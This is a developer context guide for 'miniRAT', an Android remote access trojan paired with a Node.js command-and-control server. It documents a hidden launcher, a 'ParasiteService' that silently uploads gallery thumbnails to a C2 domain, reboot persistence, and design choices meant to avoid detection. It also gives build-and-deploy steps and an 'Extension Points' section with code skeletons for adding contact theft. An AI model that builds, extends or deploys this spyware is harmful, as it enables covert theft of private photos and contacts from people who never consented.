# Project Context — miniRAT

> Developer guide covering project conventions, codebase navigation, environment setup, key design decisions, and important context for working with this codebase.

---

## Table of Contents

- [Project Identity](#project-identity)
- [Tech Stack Summary](#tech-stack-summary)
- [Codebase Map](#codebase-map)
- [Key Design Decisions](#key-design-decisions)
- [Component Roles & Responsibilities](#component-roles--responsibilities)
- [Configuration & Secrets](#configuration--secrets)
- [Build System](#build-system)
- [Android Manifest Breakdown](#android-manifest-breakdown)
- [Server API Contract](#server-api-contract)
- [Data Model](#data-model)
- [Developer Environment Setup](#developer-environment-setup)
- [Testing](#testing)
- [Conventions & Patterns](#conventions--patterns)
- [Gotchas & Pitfalls](#gotchas--pitfalls)
- [Extension Points](#extension-points)
- [File Inventory](#file-inventory)

---

## Project Identity

| Property | Value |
|---|---|
| Name | miniRAT |
| Package | `com.app.minirat` |
| Type | Android RAT + Node.js C2 server |
| Language (Client) | Java (Android) |
| Language (Server) | JavaScript (Node.js) |
| Min Android | API 21 (Android 5.0 Lollipop) |
| Target Android | API 36 |
| Repository | `Rhishavhere/miniRAT` |

---

## Tech Stack Summary

### Android Client
- **Language**: Java (no Kotlin used, despite Kotlin plugin being applied)
- **UI Framework**: None — no layouts, no Compose, no views
- **Networking**: `java.net.HttpURLConnection` (raw, no OkHttp)
- **Image Processing**: `android.graphics.BitmapFactory` and `android.graphics.Bitmap`
- **Media Access**: `android.provider.MediaStore` content provider queries
- **Encoding**: `android.util.Base64`
- **Threading**: `java.util.concurrent.ExecutorService` (single-thread) + `android.os.Handler`
- **Build System**: Gradle (Kotlin DSL) with Android Gradle Plugin

### C2 Server
- **Runtime**: Node.js
- **Framework**: Express.js
- **File Handling**: `multer` (configured but unused), native `fs`
- **CORS**: `cors` middleware
- **Dashboard**: Inline HTML/CSS/JS (no template engine, no framework)

---

## Codebase Map

```
miniRAT/
│
├── app/                                    # Android module
│   ├── build.gradle.kts                    # Module-level build config
│   ├── local.properties                    # DOMAIN_URL secret (do not commit)
│   ├── proguard-rules.pro                  # ProGuard rules (minification OFF)
│   └── src/main/
│       ├── AndroidManifest.xml             # [KEY] Permissions + component declarations
│       └── java/com/app/minirat/
│           ├── HiddenActivity.java         # [ENTRY POINT] Invisible launcher → starts service → finish()
│           ├── MainActivity.java           # [DEAD CODE] Empty activity, unused
│           ├── Service.java                # [CORE] ParasiteService — gallery exfiltration engine
│           └── BootReceiver.java           # [PERSISTENCE] Restarts service after boot
│
├── server.js                               # [C2 SERVER] Express.js — receives thumbnails, serves gallery
│
├── build.gradle.kts                        # Root Gradle build
├── settings.gradle.kts                     # Module registration
├── gradle.properties                       # JVM config for Gradle
├── gradlew / gradlew.bat                   # Gradle wrapper
│
└── .claude/                                # Project documentation
    ├── README.md                           # Full project README
    ├── ARCHITECTURE.md                     # Architecture deep-dive
    ├── ANALYSIS.md                         # Bug & security analysis
    └── CONTEXT.md                          # This file
```

---

## Key Design Decisions

### 1. Thumbnail-Only Exfiltration

The client uploads **128×128 JPEG thumbnails** (typically 5-15 KB each) rather than full-resolution images. This was a deliberate choice to:
- Reduce bandwidth consumption (less detectable)
- Reduce upload time per file
- Provide the operator with enough visual preview to identify targets
- Avoid suspiciously large data transfers

### 2. Single Background Service

All RAT functionality runs in a single `ParasiteService` (an Android `Service` component). This centralizes lifecycle management and makes it easier to start/stop all operations.

### 3. Handler-Based Periodic Tasks

Rather than using `AlarmManager` or `WorkManager`, the service uses `Handler.postDelayed()` for periodic execution. This is simpler but less reliable — if the service is killed and restarted, timing may drift.

### 4. BuildConfig for Server URL

The C2 server URL is injected at compile time via `BuildConfig.DOMAIN_URL` from `local.properties`. This keeps the URL out of the source code and allows different build variants to target different servers.

### 5. Single-Thread Executor

All file processing and network operations run on a single background thread. This:
- Prevents concurrent bitmap allocations (reduces OOM risk)
- Makes network traffic more regular/predictable
- Simulates normal app behavior better than parallel uploads

---

## Component Roles & Responsibilities

| Component | Responsibility | Active | Dependencies |
|---|---|---|---|
| `HiddenActivity` | Entry point: start service, disappear | Only during launch | `ParasiteService` |
| `ParasiteService` | All RAT operations: scan, thumbnail, upload | Continuously (30s cycles) | `BuildConfig`, `MediaStore`, `HttpURLConnection` |
| `BootReceiver` | Persistence: restart service after boot | Only on boot event | `ParasiteService` |
| `MainActivity` | None (dead code) | Never | None |
| `server.js` | Receive uploads, serve gallery | Always running | `express`, `cors`, `multer`, `fs` |

---

## Configuration & Secrets

### `local.properties` (Android client secrets)

```properties
# C2 server URL — injected into BuildConfig at compile time
DOMAIN_URL=https://myspace.rhishav.com
```

This file should **NOT** be committed to version control (it's in `.gitignore` by default for `sdk.dir`, but the `DOMAIN_URL` is custom).

### How the URL flows through the build:

```
local.properties → build.gradle.kts → BuildConfig.DOMAIN_URL → ParasiteService.SERVER_URL
```

### Server Configuration (hardcoded in server.js):

| Config | Value | Location |
|---|---|---|
| Port | `3000` | `server.js` L7 |
| Upload directory | `./uploads` | `server.js` L14 |
| CORS | Allow all origins | `server.js` L9 |
| Body parser | JSON (no size limit) | `server.js` L10 |

---

## Build System

### Gradle Structure

```
Root (build.gradle.kts)
  └── :app (app/build.gradle.kts)
```

### Key Build Commands

```bash
# Debug build
./gradlew assembleDebug

# Release build
./gradlew assembleRelease

# APK location
app/build/outputs/apk/debug/app-debug.apk
```

### Plugins Used

| Plugin | Purpose |
|---|---|
| `android.application` | Android application build |
| `kotlin.android` | Kotlin support (unused in code) |
| `kotlin.compose` | Compose compiler (unused in code) |

### Build Features

```kotlin
buildFeatures {
    compose = true     // Compose compiler enabled (unused)
    buildConfig = true // BuildConfig generation enabled (used for DOMAIN_URL)
}
```

---

## Android Manifest Breakdown

### Permissions (6 total, 3 actually used)

| Permission | Used? | By |
|---|---|---|
| `INTERNET` | ✅ | `ParasiteService` — HTTP uploads |
| `ACCESS_NETWORK_STATE` | ✅ | (Available but not explicitly checked in code) |
| `READ_EXTERNAL_STORAGE` | ✅ | `ParasiteService` — MediaStore queries |
| `WRITE_EXTERNAL_STORAGE` | ❌ | Not used anywhere |
| `WAKE_LOCK` | ❌ | Not used anywhere |
| `RECEIVE_BOOT_COMPLETED` | ✅ | `BootReceiver` — starts service on boot |

### Components (4 total, 3 active)

| Component | Type | Exported | Has Intent Filter |
|---|---|---|---|
| `HiddenActivity` | Activity | Yes | Yes (LAUNCHER) |
| `MainActivity` | Activity | No | No |
| `Service` | Service | No | No |
| `BootReceiver` | Receiver | Yes | Yes (BOOT_COMPLETED) |

---

## Server API Contract

### Upload Thumbnail

```
POST /api/upload/thumbnail
Content-Type: application/json

Request:  { "filename": string, "thumbnail": string (base64) }
Response: { "success": true, "message": string, "filename": string, "thumbnailPath": string }
Error:    { "success": false, "error": string } (500)
```

### List Thumbnails

```
GET /api/thumbnails

Response: { "thumbnails": [{ "name": string, "thumbnail": string, "uploadedAt": string }] }
Error:    { "success": false, "error": string } (500)
```

### Serve Full-Size File

```
GET /api/fullsize/:filename

Response: Raw file (200) or { "error": "File not found" } (404)
```

---

## Data Model

### Upload Storage (file-based, no database)

Each upload creates 2 files in `./uploads/`:

| File | Format | Content |
|---|---|---|
| `{filename}_thumb.jpg` | JPEG | Decoded Base64 thumbnail image |
| `{filename}.metadata.json` | JSON | `{ originalName, thumbnailPath, uploadedAt }` |

### Thumbnail Specifications

| Property | Value |
|---|---|
| Max width | 128 px |
| Max height | 128 px |
| Aspect ratio | Maintained (scale to fit) |
| Format | JPEG |
| Quality | 70% |
| Encoding (transport) | Base64 (NO_WRAP) |
| Typical size | 5–15 KB |

---

## Developer Environment Setup

### Prerequisites

1. **Android Studio** (latest stable) with Android SDK 36
2. **JDK 11+**
3. **Node.js 16+** and npm
4. Physical Android device or emulator (API 21+)

### Quick Start

```bash
# 1. Clone
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT

# 2. Configure C2 URL
echo "DOMAIN_URL=http://YOUR_SERVER_IP:3000" > app/local.properties

# 3. Start server
npm install express cors multer
node server.js

# 4. Build APK (from Android Studio or CLI)
./gradlew assembleDebug

# 5. Install on device
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## Testing

### Current State

The project has **no implemented tests**. Only template files exist:
- `app/src/test/java/.../ExampleUnitTest.kt` — Kotlin unit test template
- `app/src/androidTest/java/.../ExampleInstrumentedTest.kt` — Instrumented test template

### Verification Methods

Since there are no automated tests, verify manually:
1. **Server**: Start `node server.js`, POST a test thumbnail via curl, check `./uploads/`
2. **Client**: Install APK on device, grant storage permission manually, check logcat for "ParasiteService" tag
3. **Integration**: Install APK on device with accessible C2 server, verify thumbnails appear in gallery dashboard

---

## Conventions & Patterns

### Naming
- Package: `com.app.minirat`
- Internal naming uses "Parasite" prefix (`ParasiteService`, `ParasiteChannel`)
- Log tags match class names (`"ParasiteService"`, `"BootReceiver"`)

### Error Handling
- All exceptions are caught at method boundaries
- Errors logged via `Log.e(TAG, message, exception)`
- No exceptions propagate — all methods fail silently

### Threading
- UI thread: only used for Handler scheduling
- Background thread: single `ExecutorService` thread for all I/O

---

## Gotchas & Pitfalls

1. **File vs class name mismatch**: `Service.java` contains `ParasiteService` class — this is a compilation error waiting to happen
2. **Manifest vs code mismatch**: Manifest declares `android:name=".Service"` but actual class is `ParasiteService`
3. **URL path mismatch**: Client uses `/upload/thumbnail`, server uses `/api/upload/thumbnail` — uploads silently fail
4. **Compose dependencies loaded but unused**: Adds ~5MB to APK for no benefit
5. **Kotlin plugins applied but no Kotlin code used**: The actual source is Java
6. **`local.properties` hardcoded to specific domain**: Remember to change before deploying
7. **No runtime permissions**: App silently fails on Android 6+ without manual permission grant via Settings
8. **Scoped storage**: `MediaStore.Images.Media.DATA` returns unusable paths on Android 10+

---

## Extension Points

If you want to add new RAT capabilities, the extension pattern is:

### 1. Add a new method in `ParasiteService`
```java
private void uploadContacts() {
    executor.execute(() -> {
        // Query contacts ContentProvider
        // Build JSON payload
        // POST to server
    });
}
```

### 2. Call it from `performRATTasks()`
```java
private void performRATTasks() {
    uploadGalleryThumbnails();
    uploadContacts();        // New capability
}
```

### 3. Add a new server route in `server.js`
```javascript
app.post('/api/upload/contacts', (req, res) => {
    // Handle contact data
});
```

### 4. Add required permissions in `AndroidManifest.xml`
```xml
<uses-permission android:name="android.permission.READ_CONTACTS" />
```

---

## File Inventory

| # | File | Lines | Bytes | Language | Status |
|---|---|---|---|---|---|
| 1 | `HiddenActivity.java` | 30 | 1,013 | Java | Active |
| 2 | `MainActivity.java` | 15 | 364 | Java | Dead code |
| 3 | `Service.java` | 279 | 9,914 | Java | Active (core) |
| 4 | `BootReceiver.java` | 27 | 880 | Java | Active |
| 5 | `AndroidManifest.xml` | 55 | 2,146 | XML | Active |
| 6 | `build.gradle.kts` (app) | 74 | 2,057 | Kotlin DSL | Active |
| 7 | `local.properties` (app) | 2 | 40 | Properties | Config |
| 8 | `server.js` | 205 | 7,182 | JavaScript | Active |
| 9 | `Color.kt` | — | — | Kotlin | Unused |
| 10 | `Theme.kt` | — | — | Kotlin | Unused |
| 11 | `Type.kt` | — | — | Kotlin | Unused |
| — | **Total active source** | **~610** | **~21,559** | — | — |
